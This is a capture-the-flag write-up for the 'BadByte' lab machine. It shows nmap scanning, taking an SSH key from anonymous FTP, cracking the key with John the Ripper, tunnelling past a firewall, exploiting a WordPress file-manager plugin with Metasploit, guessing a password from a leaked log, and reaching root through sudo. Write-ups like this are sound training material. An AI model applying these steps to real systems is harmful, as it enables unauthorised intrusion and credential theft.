# BadByte Write-up: Easy

## Nmap 

```
nmap -sC -sV <ip> -p-
```

Open ports:
- 22: ssh. OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
- 30024: ftp. vsftpd 3.0.3. Anonymous login allowed

None of the versions appear to be vulnerable.

## FTP and John the Ripper

Nmap showed we have anonymous access to the ftp server with some interesting files:
```
ftp <ip> 30024
get note.txt
get id_rsa
```
note.txt informs us about the key in the same directory and gives us a username **errorcauser**, so I downloaded the private key and used ssh2john with John the Ripper and the rockyou wordlist to attempt to crack the key.

```
ssh2john id_rsa > johnkey
john --wordlist=rockyou.txt johnkey
```

which quickly cracked the credentials for ssh: **errorcauser : cupcake**.

## SSH

```
chmod 600 id_rsa
ssh errorcauser@<ip> -i id_rsa -D 1337
```

I gave the key the correct permissions and used tunnelling to bypass the firewall and get an initial shell on the system.
Some helpful information was found in the note.txt file in the current directory:
```
Hi Error!
I've set up a webserver locally so no one outside could access it.
It is for testing purposes only.  There are still a few things I need to do like setting up a custom theme.
You can check it out, you already know what to do.
-Cth
:)
```

## Wordpress Enumeration

After using dynamic port forwarding and proxychains to bypass the firewall, I evaluated the webserver running on port 80 using nmap with http-wordpress-enum and wpscan.

```
proxychains nmap -sT 127.0.0.1 --script=http-wordpress-enum
wpscan --url http://127.0.0.1:<port> -e ap,at -vv
```

note.txt indicated that the theme might be vulnerable, and running searchsploit on the installed duplicator plugin found by nmap confirmed an arbitrary file read exploit.
The more interesting vulnerability, though, is in the wp-file-manager plugin with version 6.0, so I fired up Metasploit to exploit it.

```
msfconsole
use exploit/multi/http/wp_file_manager_rce 
<set options>
run
```
This gave me a meterpreter session, where I could find the flag in cth's home directory.

## Privilege Escalation to root

When browsing the file system, I found an interesting log file /var/log/bash.log. This contained the password **G00dP@$sw0rd2020** so I tried to ssh to get a proper shell for the cth user with this password.

```
ssh cth@<ip> -i id_rsa -D 1337
```

However, it said the password was incorrect. After some head scratching, I tried to brute force ssh with some similar passwords, and eventually got in with **G00dP@$sw0rd2021** by incrementing the year at the end of the password. I then logged in as cth.

Evaluating the sudo permissions to find a privilege escalation vector:
```
sudo -l
User cth may run the following commands on badbyte:
    (ALL : ALL) ALL
```

Since I can run all commands with sudo, I simply ran sudo bash to get root and find the final flag.
```
sudo bash
cat /root/root.txt
```
